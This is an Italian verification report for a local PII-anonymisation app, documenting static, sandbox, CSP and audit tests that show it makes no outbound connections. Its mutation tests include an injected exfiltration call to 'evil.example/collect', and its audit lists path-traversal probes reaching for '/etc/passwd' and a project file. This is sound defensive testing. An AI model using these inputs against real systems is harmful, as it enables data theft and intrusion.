# Verifica: AnonimAI gira in locale e non ha telemetria

> **A che cosa serve questo documento.** A rendere *dimostrabile* ciò che il progetto
> dichiara: nessun dato lascia il computer, nessuna telemetria, nessun aggiornamento
> automatico. Ogni riga qui sotto è una prova con il suo comando e il suo esito, ripetibile
> da chiunque. Dove una prova non è stata fatta, o non è conclusiva, sta scritto: la sezione
> §5 esiste apposta.
> **Data della campagna:** 4 settembre 2026 · macOS 26.6.2, Python 3.10.11, modello
> `rizzo-pii-0.3B-v1.5.0` su CPU · commit di partenza `d1249e4`.

## 1. Come rifare tutto

```bash
python -m unittest discover tests     # 94 prove, senza modello, in meno di 1 secondo
python src/app/smoke_offline.py       # 22 endpoint con la rete bloccata (serve il modello)
```

## 2. I quattro piani della verifica

Nessuna singola prova basta: un'analisi statica non vede una libreria nativa, un blocco
in-process non vede un processo figlio, e una prova di sistema non dice *perché*. I quattro
piani insieme coprono i buchi l'uno dell'altro.

| Piano | Che cosa esclude | Dove |
|---|---|---|
| **Statico** — si legge il codice | che esista *il modo* di parlare con la rete | `tests/test_no_egress.py` |
| **In-process** — si blocca `socket.connect` | che una libreria Python provi a connettersi durante l'uso reale | `src/app/smoke_offline.py` |
| **Di sistema** — sandbox che nega la rete | che qualcosa esca al di fuori di Python (librerie native comprese) | §4, `sandbox-exec` |
| **Nel browser** — CSP applicata dal motore | che uno script della pagina esfiltri dati | §4, console del browser |

## 3. Prove statiche — `tests/test_no_egress.py` (10 prove)

Vietano, nel codice di `src/app/`, nella UI, in Electron e nel guscio Rust:

| Prova | Che cosa nega |
|---|---|
| `test_nessun_import_di_rete` | `requests`, `urllib`, `httpx`, `aiohttp`, `smtplib`, SDK di analytics… `socket` solo in `server_config.py` (pre-bind della porta) e in `smoke_offline.py` (che lo blocca) |
| `test_nessuna_url_assoluta_nel_codice_python` | un URL dentro una chiamata |
| `test_fetch_solo_relative` | una `fetch` che non inizi per `/` |
| `test_niente_canali_di_uscita` | `XMLHttpRequest`, `sendBeacon`, `EventSource`, `WebSocket`, `importScripts` |
| `test_niente_risorse_esterne` | `src`/`href` assoluti che la pagina *carichi* (i link dei Crediti restano, sono `<a>` aperti su gesto dell'utente) |
| `test_csp_vieta_le_connessioni_esterne` | una CSP senza `connect-src 'self'` — letta dall'**AST**, non dal testo |
| `test_env_offline_prima_degli_import_pesanti` | che `HF_HUB_OFFLINE`, `TRANSFORMERS_OFFLINE`, `HF_HUB_DISABLE_TELEMETRY`, `DO_NOT_TRACK` non siano impostate **prima** di `import torch` |
| `test_nessun_aggiornamento_automatico` | `updater` in Tauri, `electron-updater` |
| `test_rust_senza_client_http` | `reqwest`, `hyper`, `ureq`, `curl` in `Cargo.toml` |
| `test_electron_parla_solo_col_backend_locale` | una `fetch` di Electron fuori da `127.0.0.1` |

**Le prove sono state provate.** Un test che non fallisce mai non dimostra niente: sono state
iniettate **10 violazioni**, una per volta, verificando che ognuna renda la suite rossa.

| Violazione iniettata | Esito |
|---|---|
| `import requests` in `pdf_export.py` | rossa |
| `fetch('https://evil.example/collect')` nella UI | rossa |
| `navigator.sendBeacon` nella UI | rossa |
| `<script src="https://cdn.example/a.js">` nel markup | rossa |
| variabile offline rinominata (`HF_HUB_OFFLINE_X`) | rossa |
| `connect-src 'self'` rimossa dalla CSP | rossa |
| `reqwest` in `Cargo.toml` | rossa |
| `fetch` esterna in `electron/main.js` | rossa |
| `urlopen(...)` in `app.py` | rossa |
| `"updater": {"active": true}` in `tauri.conf.json` | rossa |

Due di queste, **al primo giro, restarono verdi** e hanno fatto correggere i test:
il controllo delle variabili d'ambiente cercava una sottostringa (`HF_HUB_OFFLINE_X` la
conteneva) e quello della CSP trovava la direttiva **in un commento**. Ora entrambi leggono
l'AST. Lo stesso metodo è applicato a `tests/test_claims.py` (7 mutazioni, tutte rosse).

## 4. Prove dinamiche

### 4.1 Rete bloccata in-process — `src/app/smoke_offline.py`

`socket.connect`, `connect_ex` e `create_connection` sono sostituiti da versioni che
**lanciano** se l'indirizzo non è loopback, *prima* di importare `app` (quindi prima che il
modello venga caricato). Poi si esercita l'app intera.

```
AnonimAI 2.0.0 · modello rizzo-pii-0.3B-v1.5.0 · OCR attivo
Rete verso l'esterno: BLOCCATA in-process
endpoint provati: 22 · ok: 22 · problemi: 0
tentativi di connessione verso l'esterno: 0
```

Coperti: `/`, `/health`, `/settings`, `/config`, `/assets/…`, `/analyze` (testo, PDF nativo,
PDF scansionato con OCR, dizionario spento), `/pdf` (con e senza riquadri manuali),
`/pdf/preview`, `/doc/<id>/page/0.png` a 110 e 220 dpi, `/doc/<id>/file.pdf`, `/preview`.
Su ogni risposta si verificano le intestazioni di sicurezza; sul testo anonimizzato si
verifica che **nessuno** dei valori sensibili sia rimasto in chiaro.

**Difetto trovato da questa prova** (e corretto): le PNG delle pagine — che sono il documento,
PII comprese — venivano servite **cacheabili**. `send_file()` imposta un proprio
`Cache-Control` e il codice lo proponeva con `setdefault`, quindi la WebView poteva scriverle
su disco. Ora `no-store` è imposto su ogni risposta.

### 4.2 Sandbox di sistema che nega la rete

```bash
# profilo: (deny network*) con la sola eccezione di localhost
sandbox-exec -f no-net.sb .venv/bin/python src/app/app.py --port 5014
```

| Controllo | Esito |
|---|---|
| L'app si avvia e carica il modello | sì |
| `/health` risponde, `/analyze` anonimizza (6 entità su una frase ticinese) | sì |
| Socket aperti dal processo (`lsof -nP -a -p <pid> -i`) | **uno solo**: `TCP 127.0.0.1:5014 (LISTEN)` |
| Connessioni verso indirizzi non-loopback | **0** |
| Errori di rete nel log (`denied`, `refused`, `urlopen`, `SSLError`…) | **0** — nessun tentativo, nemmeno fallito |
| Processi figli | uno: il `multiprocessing.resource_tracker` di Python, **senza socket** |

Il punto che conta: l'app **non si accorge** di non avere rete. Se ne avesse bisogno, qui
fallirebbe.

### 4.3 CSP applicata dal browser

Il server manda su ogni risposta:

```
Content-Security-Policy: default-src 'self'; connect-src 'self'; img-src 'self' data: blob:;
  script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self';
  media-src 'none'; object-src 'none'; frame-src 'none'; form-action 'none';
  base-uri 'none'; frame-ancestors 'none'
Cache-Control: no-store, no-cache, must-revalidate, private
X-Content-Type-Options: nosniff · Referrer-Policy: no-referrer · X-Frame-Options: DENY
```

Provato nella pagina viva, con la console aperta:

| Tentativo | Esito |
|---|---|
| `fetch('https://example.com/x')` | **bloccato** — «violates … "connect-src 'self'"» |
| `new WebSocket('wss://example.com/x')` | **bloccato** |
| `navigator.sendBeacon('https://example.com/b')` | **bloccato** |
| `<img src="https://placehold.co/10x10.png">` | **bloccato** — «violates … "img-src 'self' data: blob:"» |
| Pagine del documento `/doc/<id>/page/N.png` (110 e 220 dpi) | caricate: 910×1287 e 1819×2573 |
| Immagini `data:` e `blob:` (servono all'app) | caricate |
| Download del dizionario e del Rapporto (blob) | funzionanti, nessuna violazione in console |

Questa è la differenza fra una promessa e una garanzia: **non è l'app a rifiutarsi di
chiamare fuori, è il motore del browser a impedirlo.**

### 4.4 Superfici d'ingresso (audit «dopo»)

| Prova | Esito |
|---|---|
| Traversal su `/assets`: `../../CLAUDE.md`, `..%2f..%2f…`, `....//`, `%2e%2e/`, `/etc/passwd` | nessuna fuga: 404, o la pagina dell'app dopo la normalizzazione dell'URL. La route ora passa **solo** da `send_from_directory` (che sanifica); il vecchio `os.path.isfile(os.path.join(...))` faceva `stat` su un percorso non sanificato ed è stato tolto |
| Identificatore di documento | `secrets.token_urlsafe(12)`, 16 caratteri: non indovinabile |
| Metodi non previsti (`PUT`, `DELETE` su `/analyze`) | 405 |
| Corpo oltre il limite (51 MB) | 413 (`MAX_CONTENT_LENGTH` = 50 MB) |
| Vulnerabilità note nelle dipendenze (`pip-audit` sul freeze) | **nessuna** |
| Documenti in memoria | LRU di 6 + scadenza a 30 minuti di inattività, mai su disco |

## 5. Che cosa NON è stato verificato

Elenco onesto: sono i limiti di questa campagna, non difetti noti.

1. **Windows e l'installer**: il workflow che produce l'`.exe` e la sua impronta `.sha256` è
   valido come YAML ma **non è stato eseguito** su un runner. Nessuna prova su Windows.
2. **Tauri ed Electron**: il guscio nativo non è stato lanciato. Verificato staticamente
   (nessun client HTTP, nessun updater), non a runtime. La CSP nella finestra Tauri non è
   stata osservata dal vivo.
3. **`crypto.subtle`, `sessionStorage` e i download dentro WebView2/WKWebView**: provati in un
   browser desktop su `http://127.0.0.1`, non nelle WebView native.
4. **La scadenza a 30 minuti**: verificata leggendo il codice e la logica di sweep, **non
   aspettando 30 minuti** di orologio.
5. **Docker**: non installato su questa macchina. `docker run --network none` resta il
   comando da eseguire per la prova equivalente in container.
6. **Il banner «server esposto»**: provato simulando l'hostname nella pagina, non
   raggiungendo davvero il server da un'altra macchina.
7. **La redazione dei nuovi formati svizzeri dentro un PDF**: `/pdf` è stato esercitato sui
   PDF di prova, che non contengono un IDI o un importo con l'apostrofo. La rete regex li
   trova nel testo (32 casi in `tests/fixtures_ticino.jsonl`); il loro percorso completo
   *dentro* un PDF non è coperto da una prova dedicata.
8. **La tessera d'assicurato** `80756…` è riconosciuta **solo per forma**: non è stato
   possibile documentare l'algoritmo della cifra di controllo, quindi non c'è validazione.
9. **L'IDI/UID**: il checksum mod-11 è verificato su **un** IDI pubblico e sui pesi trovati in
   una fonte secondaria. Un secondo IDI reale confermerebbe meglio.
10. **Il contenuto giuridico** di `TERMS.md` e `docs/CONFORMITA-CH.md` non è validato da un
    avvocato: sono bozze, e lo dicono in testa.
11. **La firma del codice su Windows** non esiste (serve un certificato); su macOS il README
    dichiara la notarizzazione, che non è stata verificata in questa campagna.
12. **Il modello**: non è stato ri-addestrato né ri-valutato. Il micro-F1 0,989 resta il
    benchmark **italiano** del progetto originale.

## 6. Che cosa resta vero per costruzione

- L'app **non ha un client HTTP**. Non è che non lo usi: non ce l'ha.
- Le variabili d'ambiente spengono la ricerca in rete di `transformers` e `huggingface_hub`
  **prima** che quelle librerie vengano importate, e la telemetria di Hugging Face con loro.
- Non esiste alcun meccanismo di aggiornamento automatico: nessun componente contatta un
  server per sapere se esiste una versione nuova.
- Il server ascolta su `127.0.0.1`. Se qualcuno lo espone, la pagina lo **dice a chi la usa**
  con un banner.
- I documenti vivono in RAM e muoiono con il processo o dopo 30 minuti; da oggi non finiscono
  nemmeno nella cache del browser.
